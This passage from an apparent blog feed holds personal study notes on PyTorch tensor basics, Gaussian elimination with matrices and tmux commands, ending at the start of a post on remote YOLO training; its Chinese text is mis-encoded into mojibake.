torch.zeros_like(initial_tensor)\<br>print(new_tensor_zeros)\<br>\<br><em># tensor elements sampled from uniform distribution between 0 and 1\</em><br>new_tensor_rand = torch.rand_like(initial_tensor)\<br>print(new_tensor_rand)\<br>\<br><em># tensor elements sampled from a standard normal distribution\</em><br>new_tensor_randn = torch.randn_like(initial_tensor)\<br>print(new_tensor_randn)</p><p>è¾“å‡ºï¼š</p><p>tensor([[4., 5.],</p><p>[6., 7.]])</p><p>tensor([[1., 1.],</p><p>[1., 1.]])</p><p>tensor([[0., 0.],</p><p>[0., 0.]])</p><p>tensor([[0.7206, 0.8806],</p><p>[0.9344, 0.1921]])</p><p>tensor([[ 0.0496, 1.0113],</p><p>[-1.1891, -1.1005]])</p><h2 id="Torchéšæœºæ•°randå’Œrandn"><a href="#Torchéšæœºæ•°randå’Œrandn" class="headerlink" title="Torchéšæœºæ•°randå’Œrandn"></a>Torchéšæœºæ•°randå’Œrandn</h2><p>æƒ³ç”Ÿæˆ**[0,1)** èŒƒå›´çš„éšæœºæ•° â†’ ç”¨ rand_like</p><p>æƒ³ç”Ÿæˆ<strong>æœ‰æ­£æœ‰è´Ÿã€ç¬¦åˆæ­£æ€åˆ†å¸ƒ</strong>çš„å™ªå£°æˆ–æƒé‡åˆå§‹å€¼ â†’ ç”¨ randn_like</p><p><strong>âœ… torch.rand_like() vs torch.randn_like()</strong></p><hr><p>  <strong>å‡½æ•°å</strong>            <strong>å–å€¼èŒƒå›´/åˆ†å¸ƒ</strong>                 <strong>å¸¸ç”¨åœºæ™¯</strong></p><hr><p>  torch.rand_like(t)    <strong>[0.0, 1.0)</strong>                   éšæœºåˆå§‹åŒ–ï¼ˆéè´Ÿï¼‰<br>                        å‡åŒ€åˆ†å¸ƒï¼ˆuniformï¼‰               </p><p>  torch.randn_like(t)   <strong>æ­£æ€åˆ†å¸ƒ N(0, 1)</strong>ï¼Œå‡å€¼        æƒé‡åˆå§‹åŒ–ã€æ¨¡æ‹Ÿå™ªå£°</p><pre><code>                    0ï¼Œæ ‡å‡†å·® 1                       </code></pre><hr><h2 id="å½¢çŠ¶-å®ä¾‹åŒ–ğŸ¡ªå¼ é‡"><a href="#å½¢çŠ¶-å®ä¾‹åŒ–ğŸ¡ªå¼ é‡" class="headerlink" title="å½¢çŠ¶-->å®ä¾‹åŒ–ğŸ¡ªå¼ é‡"></a><strong>å½¢çŠ¶-->å®ä¾‹åŒ–ğŸ¡ªå¼ é‡</strong></h2><h3 id="æ ¹æ®shapeåˆå§‹åŒ–"><a href="#æ ¹æ®shapeåˆå§‹åŒ–" class="headerlink" title="æ ¹æ®shapeåˆå§‹åŒ–"></a>æ ¹æ®shapeåˆå§‹åŒ–</h3><p>There are many ready methods where we can instantiate tensors by<br>specifying their shapes,<br>namely, <strong>torch.zeros()</strong>, torch.<strong>ones</strong>(), torch.<strong>rand</strong>(),<br>and torch.<strong>randn</strong>()</p><p>æ¯”å¦‚ shape=(2, 3, 4) ç”Ÿæˆçš„æ•°å­—ä¸ªæ•°å°±æ˜¯ 2*3*4 = 24</p><p>import torch</p><p>shape = (2, 3, 4)</p><p>x_zeros = torch.zeros(shape)</p><p>print(x_zeros)</p><p>x_ones = torch.ones(shape)</p><p>print(x_ones)</p><p>torch.manual_seed(142)</p><p>random = torch.rand(shape)</p><p>print(random)</p><h3 id="ç›´æ¥arangeç”Ÿæˆä¸€ç»´æ•°ç»„"><a href="#ç›´æ¥arangeç”Ÿæˆä¸€ç»´æ•°ç»„" class="headerlink" title="ç›´æ¥arangeç”Ÿæˆä¸€ç»´æ•°ç»„"></a>ç›´æ¥arangeç”Ÿæˆä¸€ç»´æ•°ç»„</h3><p>import torch\<br>x = torch.arange(start=0, end=10, step=2)\<br>print(x)</p><p>We can also check the size of a particular dimension of a tensor<br>using size() method.</p><p>import torch</p><p>x = torch.Tensor([[11, 12], [13, 14], [15, 16]])</p><p>print(x.shape)</p><p>print(x.size(0))</p><h2 id="æŒ‡å®šè®¾å¤‡å­˜å‚¨å¼ é‡ï¼ˆä¸ºä½•tensorå¿…é¡»æŒ‡å®šè®¾å¤‡ï¼‰"><a href="#æŒ‡å®šè®¾å¤‡å­˜å‚¨å¼ é‡ï¼ˆä¸ºä½•tensorå¿…é¡»æŒ‡å®šè®¾å¤‡ï¼‰" class="headerlink" title="æŒ‡å®šè®¾å¤‡å­˜å‚¨å¼ é‡ï¼ˆä¸ºä½•tensorå¿…é¡»æŒ‡å®šè®¾å¤‡ï¼‰"></a>æŒ‡å®šè®¾å¤‡å­˜å‚¨å¼ é‡ï¼ˆä¸ºä½•tensorå¿…é¡»æŒ‡å®šè®¾å¤‡ï¼‰</h2><ul><li><p><strong>CPU å†…å­˜</strong> å’Œ <strong>GPU å†…å­˜</strong> æ˜¯ä¸¤ä¸ªç‰©ç†ä¸Šä¸åŒçš„åŒºåŸŸã€‚</p></li><li><p><strong>ä¸€ä¸ªå¼ é‡åªèƒ½</strong>åœ¨<strong>æŸä¸€å—å†…å­˜ä¸­å­˜åœ¨</strong>ï¼Œè¦ç”¨ GPU<br>ç®—æ³•è®¡ç®—ï¼Œå°±å¿…é¡»å…ˆæŠŠæ•°æ®æ”¾è¿› GPUã€‚</p></li></ul><p>ä¸¾ä¸ªæ¯”å–»ï¼š</p><p>å°±åƒä½ æœ‰ä¸¤ä¸ªå·¥ä½œå°ï¼ˆCPU å’Œ GPUï¼‰ï¼Œä½ ä¸å¯èƒ½åœ¨ CPU çš„æ¡Œå­ä¸Šç”¨ GPU<br>çš„å·¥å…·å¹²æ´»ï¼Œå·¥å…·ï¼ˆå‡½æ•°ï¼‰å’Œææ–™ï¼ˆæ•°æ®ï¼‰å¾—åœ¨ä¸€ä¸ªåœ°æ–¹ã€‚</p><p><strong>é«˜æ•ˆè®¡ç®—éœ€è¦æ˜ç¡®ä½ç½®</strong></p><ul><li>å¦‚æœå¼ é‡ä½ç½®ä¸ä¸€è‡´ï¼ˆæ¯”å¦‚ä¸€ä¸ªåœ¨ CPUã€å¦ä¸€ä¸ªåœ¨<br>GPUï¼‰ï¼Œå°±æ²¡æ³•ç›´æ¥è¿›è¡Œæ“ä½œï¼Œä¼šæŠ›é”™ã€‚</li></ul><p>a = torch.tensor([1, 2]).to(\â€™cuda\â€™)</p><p>b = torch.tensor([3, 4]) # <strong>é»˜è®¤åœ¨ CPU</strong></p><p>a + b # âŒ ä¼š<strong>æŠ¥é”™</strong>ï¼šExpected all tensors to be on the same device</p><p>import torch\<br>x = torch.Tensor([[7, 8], [9, 10], [15, 17]])\<br>print(x)\<br>\<br><em># Determine on which device tensor is stored\</em><br>print(x.device)\<br>\<br><em># Check if a GPU is available; if so, move the tensor to the GPU\</em><br>print(torch.cuda.is_available())\<br>\<br>if torch.cuda.is_available():\<br><em># [x.to(\â€™cuda\â€™)]{.mark} #<br>è¿™æ˜¯<strong>[æ— æ„ä¹‰æ“ä½œ]{.mark}</strong>ï¼Œ**</em>.to(\â€™cuda\â€™) å¹¶ä¸ä¼šä¿®æ”¹åŸå§‹çš„å¼ é‡<br>xï¼Œå®ƒåªæ˜¯è¿”å›äº†ä¸€ä¸ªæ–°å¼ é‡ï¼Œè¿™ä¸ªæ–°å¼ é‡æ‰åœ¨ CUDA ä¸Š<strong><em>ã€‚\</em><br># è€Œä½ æ²¡æœ‰æ¥ä½è¿™ä¸ªæ–°å¼ é‡ï¼Œå°±ç›¸å½“äºï¼š # æ–°å¼ é‡è¢«åˆ›å»º # ä½ æ²¡ä¿å­˜å®ƒ #<br>å®ƒç«‹å³è¢«é”€æ¯ # x ä»ç„¶åœ¨ CPU ä¸Š\<br>[# </strong>æ­£ç¡®å†™æ³•<strong>ï¼š<em>\</em></strong>x = x.to(\â€™cuda\â€™)**]{.mark}\<br>print(\â€To cuda successfully\â€)\<br>print(x.device)</p><h2 id="tensoræ“ä½œ"><a href="#tensoræ“ä½œ" class="headerlink" title="tensoræ“ä½œ"></a>tensoræ“ä½œ</h2><h3 id="åŠ å‡ä¹˜é™¤"><a href="#åŠ å‡ä¹˜é™¤" class="headerlink" title="åŠ å‡ä¹˜é™¤"></a>åŠ å‡ä¹˜é™¤</h3><p>è·ŸNumpyå·®ä¸å¤š</p><p>import torch\<br>x = torch.tensor([1, 2, 3], dtype=torch.float)\<br>y = torch.tensor([4, 5, 6], dtype=torch.float)\<br>print([x+y]{.mark})\<br>\<br><em># you can also use torch.add()\</em><br>print([torch.<strong>add</strong>(x,y)]{.mark})</p><p>import torch\<br>x = torch.tensor([1, 2, 3], dtype=torch.float)\<br>y = torch.tensor([4, 5, 6], dtype=torch.float)\<br>\<br>print(torch.add(x,y))\<br>print(<strong>torch.add(x,y).[sum]{.mark}()</strong>)</p><p>è¾“å‡ºï¼štensor([21]{.mark}.) å› ä¸ºå…¨éƒ¨çš„æ•°åŠ åœ¨ä¸€èµ·å°±æ˜¯21</p><h3 id="Dot-Product-and-Matrix-Multiplication"><a href="#Dot-Product-and-Matrix-Multiplication" class="headerlink" title="Dot Product and Matrix Multiplication"></a><em>Dot Product and Matrix Multiplication</em></h3><h4 id="ç‚¹ä¹˜"><a href="#ç‚¹ä¹˜" class="headerlink" title="ç‚¹ä¹˜"></a>ç‚¹ä¹˜</h4><p>import torch</p><p>x = torch.tensor([1, 2, 3], dtype=torch.float)</p><p>y = torch.tensor([4, 5, 6], dtype=torch.float)</p><p># Dot product</p><p>print(x.<strong>[dot]{.mark}</strong>(y))</p><h4 id="çŸ©é˜µä¹˜"><a href="#çŸ©é˜µä¹˜" class="headerlink" title="çŸ©é˜µä¹˜"></a>çŸ©é˜µä¹˜</h4><p>import torch\<br>x = torch.tensor([[1, 2, 3], [4, 5, 6]], dtype=torch.float)\<br>y = torch.tensor([[1, 2], [3, 4], [5, 6]], dtype=torch.float)</p><h5 id="ä¸‰ç§çŸ©é˜µä¹˜æ³•çš„è¡¨ç¤º"><a href="#ä¸‰ç§çŸ©é˜µä¹˜æ³•çš„è¡¨ç¤º" class="headerlink" title="ä¸‰ç§çŸ©é˜µä¹˜æ³•çš„è¡¨ç¤º"></a><em>ä¸‰ç§çŸ©é˜µä¹˜æ³•çš„è¡¨ç¤º</em></h5><p><em># Matrix Multiplication\</em><br>print(torch.matmul(x, y))\<br>\<br><em># you can also use torch.mm()\</em><br>print(torch.mm(x, y))\<br>\<br><em># or you can use x@y\</em><br>print(x@y)</p><h3 id="åˆå¹¶"><a href="#åˆå¹¶" class="headerlink" title="åˆå¹¶"></a>åˆå¹¶</h3><p>import torch\<br>\<br><em># creating a tensor\</em><br>x = torch.ones(2, 2, 4)\<br>print(x)\<br>\<br>y = torch.ones(2, 2, 4)\<br>print(y)</p><p># catæ˜¯ç²˜è´´çš„æ„æ€ï¼Œdimæ˜¯è¯´æ²¿ç€ç¬¬å‡ ç»´åº¦è¿›è¡Œåˆå¹¶</p><p>z_cat = <strong>torch.cat([x, y], [dim]{.mark}=2)</strong></p><p><strong># z_cat = torch.cat([x, y], dim=1)\</strong><br>print(z_cat)</p><h1 id="Google-colab"><a href="#Google-colab" class="headerlink" title="Google colab"></a>Google colab</h1><p>å°±æ˜¯Googleäº‘ç«¯Jupyterï¼Œå¯ä»¥æŒ‡å®šruntimeçš„æ˜¾å¡æ¥è¿è¡Œä¸€äº›tensor</p><p><img src="/2025/06/10/COMP9444/numpy/image5.png" alt>{width=â€5.768055555555556inâ€<br>height=â€2.295138888888889inâ€}</p><h2 id="ä»£ç ï¼špythonæ£€æŸ¥å½“å‰tensorçš„å…¨éƒ¨å¯ç”¨è®¾å¤‡"><a href="#ä»£ç ï¼špythonæ£€æŸ¥å½“å‰tensorçš„å…¨éƒ¨å¯ç”¨è®¾å¤‡" class="headerlink" title="ä»£ç ï¼špythonæ£€æŸ¥å½“å‰tensorçš„å…¨éƒ¨å¯ç”¨è®¾å¤‡"></a>ä»£ç ï¼špythonæ£€æŸ¥å½“å‰tensorçš„å…¨éƒ¨å¯ç”¨è®¾å¤‡</h2><p># æ£€æŸ¥å…¨éƒ¨å¯ç”¨çš„tensorè®¾å¤‡</p><p>import torch</p><p>x = torch.randn(2, 2)</p><p>print(x.device)</p><p>print(torch.cuda.is_available())  # True or False</p><p>if torch.cuda.is_available():</p><pre><code>print(\&quot;å¯ç”¨GPUæ•°é‡:\&quot;, torch.cuda.device_count())for i in range(torch.cuda.device_count()):    print(f\&quot;GPU &#123;i&#125;: &#123;torch.cuda.get_device_name(i)&#125;\&quot;)</code></pre><p>def list_all_available_devices():</p><pre><code>devices = \[\&#39;cpu\&#39;\]if torch.cuda.is_available():    devices += \[f\&#39;cuda:&#123;i&#125;\&#39; for i in</code></pre><p>range(torch.cuda.device_count())]</p><pre><code>return devices</code></pre><p>print(\â€æ‰€æœ‰å¯ç”¨è®¾å¤‡:\â€, list_all_available_devices())</p><h2 id="è®¾ç½®ä»…cpu"><a href="#è®¾ç½®ä»…cpu" class="headerlink" title="è®¾ç½®ä»…cpu"></a>è®¾ç½®ä»…cpu</h2><p><img src="/2025/06/10/COMP9444/numpy/image6.png" alt="A screenshot of a computer AI-generated content may beincorrect.">{width=â€5.768055555555556inâ€<br>height=â€3.8833333333333333inâ€}</p><h2 id="è®¾ç½®TPUçš„runtime"><a href="#è®¾ç½®TPUçš„runtime" class="headerlink" title="è®¾ç½®TPUçš„runtime"></a>è®¾ç½®TPUçš„runtime</h2><p>Runtime -> change runtime type -> æ”¹TPU</p><p><img src="/2025/06/10/COMP9444/numpy/image7.png" alt="A screenshot of a computer AI-generated content may beincorrect.">{width=â€4.124489282589677inâ€<br>height=â€2.426228127734033inâ€}</p><p>æˆ‘æ”¹T4 TPU</p><p><img src="/2025/06/10/COMP9444/numpy/image8.png" alt="A screenshot of a computer program AI-generated content may beincorrect.">{width=â€4.136831802274716inâ€<br>height=â€3.4898600174978127inâ€}</p><p>å‘ç°Tesla T4 æ˜¾å¡</p>]]></content>
      
      
      <categories>
          
          <category> COMP9444 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>LA2-Elimination-with-Matrices</title>
      <link href="/2025/04/10/Math/LA2-Elimination-with-Matrices/"/>
      <url>/2025/04/10/Math/LA2-Elimination-with-Matrices/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="#gaussian-elimination">Gaussian Elimination</a><ul><li><a href="#elimination--gain-correct-pivots">Elimination \&amp; gain correct pivots</a><ul><li><a href="#ä¸ºä»€ä¹ˆä¸æ¥å—pivotæ˜¯0">ä¸ºä»€ä¹ˆä¸æ¥å—pivotæ˜¯0</a></li><li><a href="#if-pivot-is-zero">if pivot is zero</a></li></ul></li><li><a href="#back-substitution">Back-substitution</a></li></ul></li><li><a href="#endbmatrix">\end{bmatrix}</a></li><li><a href="#endbmatrix-1">\end{bmatrix}</a></li><li><a href="#endbmatrix-2">\end{bmatrix}</a></li><li><a href="#endbmatrix-3">\end{bmatrix}</a></li><li><a href="#endbmatrix-4">\end{bmatrix}</a><ul><li><a href="#associative-property-of-multiplication-of-matrices">Associative Property of Multiplication of matrices</a></li></ul></li><li><a href="#e_32e_21au">E_{32}(E_{21}A)=U</a><ul><li><a href="#permutation-exchange-rows-1-and-2">Permutation: Exchange rows 1 and 2</a></li></ul></li><li><a href="#endbmatrix-5">\end{bmatrix}</a><ul><li><a href="#permutation-exchange-columns-1-and-2">Permutation: Exchange columns 1 and 2</a></li></ul></li><li><a href="#endbmatrix-6">\end{bmatrix}</a></li><li><a href="#inverses">Inverses</a></li><li><a href="#endbmatrix-7">\end{bmatrix}</a></li><li><a href="#endbmatrix-8">\end{bmatrix}</a></li></ul><h1 id="Gaussian-Elimination"><a href="#Gaussian-Elimination" class="headerlink" title="Gaussian Elimination"></a>Gaussian Elimination</h1><ol><li><p>Elimination: Success or Failure: å°è¯•ç”¨â€œæ¶ˆå…ƒæ³•â€æŠŠ<strong>çº¿æ€§æ–¹ç¨‹ç»„</strong>å˜æˆä¸€ä¸ªâ€œä¸Šä¸‰è§’çŸ©é˜µâ€ï¼ˆå³å¯¹è§’çº¿ä»¥ä¸‹å…¨æ˜¯0ï¼‰ã€‚å¦‚æœå¯ä»¥æˆåŠŸæ¶ˆå…ƒï¼Œè¯´æ˜æ–¹ç¨‹å¯ä»¥å˜æˆä¸Šä¸‰è§’å½¢å¼ï¼›å¦‚æœæ¶ˆå…ƒå¤±è´¥ï¼Œè¯´æ˜æ–¹ç¨‹ç»„æ— è§£æˆ–è€…æœ‰æ— ç©·å¤šè§£ã€‚</p></li><li><p>Back substitutionï¼šç”¨å·²å¾—åˆ°çš„ä¸Šä¸‰è§’çŸ©é˜µï¼Œä»æœ€åä¸€è¡Œå‘ä¸Šä¸€ä¸ªä¸€ä¸ªå›ä»£ï¼Œå¯ä»¥åˆ†åˆ«æ±‚å‡ºz,y,x.</p></li><li><p>Elimination matricesï¼šæ¶ˆå…ƒçŸ©é˜µï¼Œå¯ä»¥ç”¨ç¬¬ä¸€è¡Œæ¶ˆå»ç¬¬äºŒè¡Œçš„æŸä¸ªå…ƒç´ ã€‚æ¯”å¦‚ç¬¬äºŒè¡Œå‡å»ç¬¬ä¸€è¡Œçš„æŸå€æ•°ã€‚</p></li><li><p>Matrix multiplicationï¼šçŸ©é˜µä¹˜æ³•ã€‚</p></li></ol><h2 id="Elimination-amp-gain-correct-pivots"><a href="#Elimination-amp-gain-correct-pivots" class="headerlink" title="Elimination &amp; gain correct pivots"></a>Elimination &amp; gain correct pivots</h2><script type="math/tex; mode=display">\begin{cases}x + 2y + z &= 2\\3x + 8y + z &= 12\\4y + z &= 2\end{cases}</script><script type="math/tex; mode=display">Ax=b</script><script type="math/tex; mode=display">A = \begin{bmatrix}1 & 2 & 1 \\3 & 8 & 1\\0 & 4 & 1\end{bmatrix}</script><script type="math/tex; mode=display">b = \begin{bmatrix}2 \\12 \\2\end{bmatrix}</script><p>In the matrix A, the top left element 1 is named the <strong>first pivot</strong>. Then to process the matrix. </p><script type="math/tex; mode=display">\rightarrow\begin{bmatrix}1 & 2 & 1 \\0 & 2 & -2\\0 & 4 & 1\end{bmatrix}</script><p>For example, how to calculate the second row? Because the first row is [1 2 1] and the second is [3 8 1], so to eliminate the 1st element of the 2nd row, to make 2nd row minus 3 times first row, thatâ€™s [3-3<em>1 8-3</em>2 1-3*1] to gain [0 2 -2].</p><p>Now the <strong>second pivot is the middle element in the matrix</strong> <strong>2</strong>.</p><script type="math/tex; mode=display">\rightarrow\begin{bmatrix}1 & 2 & 1 \\0 & 2 & -2\\0 & 0 & 5\end{bmatrix}</script><p>So now all pivots is [1 2 5]. Pivots cannot be 0.</p><h3 id="ä¸ºä»€ä¹ˆä¸æ¥å—pivotæ˜¯0"><a href="#ä¸ºä»€ä¹ˆä¸æ¥å—pivotæ˜¯0" class="headerlink" title="ä¸ºä»€ä¹ˆä¸æ¥å—pivotæ˜¯0"></a>ä¸ºä»€ä¹ˆä¸æ¥å—pivotæ˜¯0</h3><p>å› ä¸ºä¸‹ä¸€è¡Œ=ä¸‹ä¸€è¡Œ - (è¯¥è¡Œç³»æ•°/pivot) * å½“å‰è¡Œï¼Œå› æ­¤æ‰å¯ä»¥ä¸€ä¸ªä¸€ä¸ªæ¶ˆå…ƒã€‚æ‰€ä»¥è¦æ±‚pivotä¸å¯ä¸º0.</p><p>æ‰€ä»¥ï¼Œå¦‚ä½•è§£å†³ï¼Ÿ</p><ol><li>æ¢è¡Œ</li><li>å¤±è´¥</li></ol><h3 id="if-pivot-is-zero"><a href="#if-pivot-is-zero" class="headerlink" title="if pivot is zero"></a>if pivot is zero</h3><p>If the 1st element is 0 of the matrix, would we say that we fail? No, we dont accept zero as the pivot. So we exchange the rows.</p><p>For example, in this case, we will gain total Zeros in third row, which means not able to be invertible (next wk).</p><script type="math/tex; mode=display">\rightarrow\begin{bmatrix}1 & 2 & 1 \\0 & 2 & -2\\0 & 4 & -4\end{bmatrix}</script><h2 id="Back-substitution"><a href="#Back-substitution" class="headerlink" title="Back-substitution"></a>Back-substitution</h2><p>Augment the matrix. Augment means tack something on.</p><p>Change</p><script type="math/tex; mode=display">\begin{bmatrix}1 & 2 & 1 \\3 & 8 & 1\\0 & 4 & 1\end{bmatrix}\begin{bmatrix}2 \\12 \\2\end{bmatrix}</script><p>to</p><script type="math/tex; mode=display">\begin{bmatrix}1 & 2 & 1 & 2\\3 & 8 & 1 & 12\\0 & 4 & 1 & 2\end{bmatrix}</script><p>The [2 12 2] (vertical) is the extra column.</p><p>According the same elimination rules in step 1, so the original matrix should be:</p><script type="math/tex; mode=display">\rightarrow\begin{bmatrix}1 & 2 & 1 & 2\\0 & 2 & -2 & 6\\0 & 0 & 5 & -10\end{bmatrix}</script><script type="math/tex; mode=display">\begin{cases}x + 2y + z &= 2\\2y - 2z &= 6\\5z &= -10\end{cases}</script><p>So easily gain</p><script type="math/tex; mode=display">\begin{cases}x &= 2\\y &= 1\\z &= -2\end{cases}</script><hr><p>Matrices:</p><script type="math/tex; mode=display">\begin{bmatrix}1 & 2 & 1\\3 & 8 & 1\\0 & 4 & 1\end{bmatrix}\begin{bmatrix}3 \\4 \\5\end{bmatrix}=3 \times col1 + 4 \times col2 + 5 \times col3</script><p>Here I am not sure if there are addition signals, because there should be a matrix, but professor wrote addition signals here.</p><p><img src="/2025/04/10/Math/LA2-Elimination-with-Matrices/2025-04-09-17-26-09.png" alt></p><p>Matrices: subtract 3*row1 from row2</p><script type="math/tex; mode=display">\begin{bmatrix}\end{bmatrix}\begin{bmatrix}1 & 2 & 1\\3 & 8 & 1\\0 & 4 & 1\end{bmatrix}=\begin{bmatrix}1 & 2 & 1\\0 & 2 & -2\\0 & 4 & 1\end{bmatrix}</script><p>What matrix would do it? Note <em>Matrices: subtract 3 row1 from row2</em></p><script type="math/tex; mode=display">\begin{bmatrix}1 & 0 & 0\\-3 & 1 & 0\\0 & 0 & 1\end{bmatrix}\begin{bmatrix}1 & 2 & 1\\3 & 8 & 1\\0 & 4 & 1\end{bmatrix}=\begin{bmatrix}1 & 2 & 1\\0 & 2 & -2\\0 & 4 & 1\end{bmatrix}</script><p>Step2: Subtract 2 * row2 from row3</p><script type="math/tex; mode=display">\begin{bmatrix}\end{bmatrix}\begin{bmatrix}1 & 2 & 1\\0 & 2 & -2\\0 & 4 & 1\end{bmatrix}=\begin{bmatrix}1 & 2 & 1\\0 & 2 & -2\\0 & 0 & 5\end{bmatrix}</script><script type="math/tex; mode=display">\begin{bmatrix}1 & 0 & 0\\0 & 1 & 0\\0 & -2 & 1\end{bmatrix}\begin{bmatrix}1 & 2 & 1\\0 & 2 & -2\\0 & 4 & 1\end{bmatrix}=\begin{bmatrix}1 & 2 & 1\\0 & 2 & -2\\0 & 0 & 5\end{bmatrix}</script><h3 id="Associative-Property-of-Multiplication-of-matrices"><a href="#Associative-Property-of-Multiplication-of-matrices" class="headerlink" title="Associative Property of Multiplication of matrices"></a>Associative Property of Multiplication of matrices</h3><script type="math/tex; mode=display">E_{32}(E_{21}A)=U=(E_{32}E_{21})A</script><h3 id="Permutation-Exchange-rows-1-and-2"><a href="#Permutation-Exchange-rows-1-and-2" class="headerlink" title="Permutation: Exchange rows 1 and 2"></a>Permutation: Exchange rows 1 and 2</h3><script type="math/tex; mode=display">\begin{bmatrix}0 & 1\\1 & 0\end{bmatrix}\begin{bmatrix}a & b\\c & d\end{bmatrix}=\begin{bmatrix}c & d\\a & b\end{bmatrix}</script><p>There are horizontal rows above, but how to deal with columns?</p><h3 id="Permutation-Exchange-columns-1-and-2"><a href="#Permutation-Exchange-columns-1-and-2" class="headerlink" title="Permutation: Exchange columns 1 and 2"></a>Permutation: Exchange columns 1 and 2</h3><script type="math/tex; mode=display">\begin{bmatrix}a & b\\c & d\end{bmatrix}\begin{bmatrix}0 & 1\\1 & 0\end{bmatrix}=\begin{bmatrix}b & a\\d & c\end{bmatrix}</script><p>Notice the location of [0 1, 1 0], the different location leads to the contrary results.</p><h1 id="Inverses"><a href="#Inverses" class="headerlink" title="Inverses"></a>Inverses</h1><script type="math/tex; mode=display">\begin{bmatrix}\end{bmatrix}\begin{bmatrix}1 & 0 & 0\\-3 & 1 & 0\\0 & 0 & 1\end{bmatrix}=\begin{bmatrix}1 & 0 & 0\\0 & 1 & 0\\0 & 0 & 1\end{bmatrix}</script><script type="math/tex; mode=display">\begin{bmatrix}1 & 0 & 0\\3 & 1 & 0\\0 & 0 & 1\end{bmatrix}\begin{bmatrix}1 & 0 & 0\\-3 & 1 & 0\\0 & 0 & 1\end{bmatrix}=\begin{bmatrix}1 & 0 & 0\\0 & 1 & 0\\0 & 0 & 1\end{bmatrix}</script><p>Which matrix made the other matrix into an indentity?</p><p>æ³¨æ„ï¼Œä¸æ˜¯æ¯ä¸€ä¸ªçŸ©é˜µéƒ½èƒ½æ‰¾åˆ°ä¸€ä¸ªé€†çŸ©é˜µ(inverse matrix)ï¼Œç›¸ä¹˜å¾—åˆ°å•ä½çŸ©é˜µï¼ˆIdentityï¼‰</p>]]></content>
      
      
      <categories>
          
          <category> Math </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>temux</title>
      <link href="/2025/04/07/Linux-Maintain/temux/"/>
      <url>/2025/04/07/Linux-Maintain/temux/</url>
      
        <content type="html"><![CDATA[<p>ä»Šå¤©åˆšå†™å®Œyoloå¤§æ¨¡å‹è®­ç»ƒï¼Œé¹å“¥çœ‹äº†æˆ‘æ–‡ç« åæŒ‡å‡ºï¼Œæˆ‘ç”¨çš„screenæ²¡æœ‰ç›®å‰æµè¡Œçš„tumuxå¥½ç”¨ï¼Œé‚ç ”ç©¶äº†ä¸‹tmuxï¼Œç®€å•è®°å½•ä¸€äº›ä½¿ç”¨å‘½ä»¤ã€‚</p><pre><code>sudo apt install tmux</code></pre><p>tmuxå’Œscreenä¸€æ ·ï¼Œé»˜è®¤å¯ä»¥è®©sessionä½œä¸ºdaemonï¼ˆå³åå°è¿›ç¨‹ï¼‰è¿è¡Œã€‚ä¸è®ºä½ æ˜¯ä¸æ˜¯å…³é—­äº†å½“å‰SSH sessionï¼Œåå°è¿›ç¨‹ä¸€ç›´åœ¨è¿è¡Œçš„ï¼Œä¸ä¼šè‡ªåŠ¨killã€‚</p><p>ä¸å¸¦å‚æ•°ï¼Œtmuxä¼šè‡ªå·±åˆ›å»ºä¸€ä¸ªæ–°çš„sessionï¼Œè‡ªå·±åˆ‡è¿›å»: tmux</p><p>æŒ‡å®štmux sessionåå­—åˆ›å»ºï¼štmux new -s <session num or name></session></p><p>å·¦å³åˆ†å±ï¼šctrl+b å†æŒ‰ %</p><p>ä¸Šä¸‹åˆ†å±ï¼šctrl+b å†æŒ‰ â€œ</p><p>åˆ‡æ¢å“ªä¸ªçª—å£å—ï¼šctrl+b å†æŒ‰æ–¹å‘é”®</p><p>å¼€å¯æ–°çš„windowï¼ˆåŒtmux sessionï¼‰: ctrl + b å†æŒ‰c</p><p>åˆ‡æ¢windowï¼ˆåŒtmux sessionï¼‰: ctrl + b å†æŒ‰ æ•°å­—é”®</p><p>å…³é—­tmux (tmux sessionè¿˜æ´»ç€): ctrl+b d (d is detach)</p><p>åˆ—å‡ºtmux session: tmux ls</p><p>å›åˆ°tmux session: tmux a -t <session num or name></session></p><p>åˆ é™¤tmux session: tmux kill-session -t <session num or name></session></p><p>tmuxé…ç½®æ–‡ä»¶ï¼š</p><p>ç”¨æˆ·ç›®å½•ä¸‹ï¼š</p><pre><code>touch .tmux.conf</code></pre><pre><code>set -g mouse on</code></pre><p>ä»¥ä¸Šæ”¯æŒtmuxä½¿ç”¨é¼ æ ‡æ“ä½œ</p>]]></content>
      
      
      <categories>
          
          <category> Linux-Maintain </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>vastai remotely yolo</title>
      <link href="/2025/04/07/Python/vastai-remotely-yolo/"/>
      <url>/2025/04/07/Python/vastai-remotely-yolo/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="#èƒŒæ™¯">èƒŒæ™¯</a></li><li><a href="#æ”¾å¼ƒå›½å†…ç®—åŠ›å¹³å°">æ”¾å¼ƒå›½å†…ç®—åŠ›å¹³å°</a></li><li><a href="#é€‰æ‹©å›½å¤–ç®—åŠ›å¹³å°vastai">é€‰æ‹©å›½å¤–ç®—åŠ›å¹³å°vastai</a><ul><li><a href="#æ³¨å†Œè´¦å·">æ³¨å†Œè´¦å·</a></li><li><a href="#é€‰è´­gpu">é€‰è´­GPU</a></li><li><a href="#é€šè¿‡jupyterlabè¿æ¥å®ä¾‹">é€šè¿‡JupyterLabè¿æ¥å®ä¾‹</a></li></ul></li><li><a href="#å¼€å§‹è®­ç»ƒ">å¼€å§‹è®­ç»ƒ</a><ul><li><a href="#æ‘†å¥½yoloçš„è®­ç»ƒå§¿åŠ¿">æ‘†å¥½yoloçš„è®­ç»ƒå§¿åŠ¿</a><ul><li><a href="#datayaml">data.yaml</a></li><li><a href="#train_yolopy">train_yolo.py</a></li></ul></li><li><a href="#ä½¿ç”¨screenè®©è®­ç»ƒåå°è¿è¡Œ">ä½¿ç”¨screenè®©è®­ç»ƒåå°è¿è¡Œ</a></li></ul></li></ul><h1 id="èƒŒæ™¯"><a href="#èƒŒæ™¯" class="headerlink" 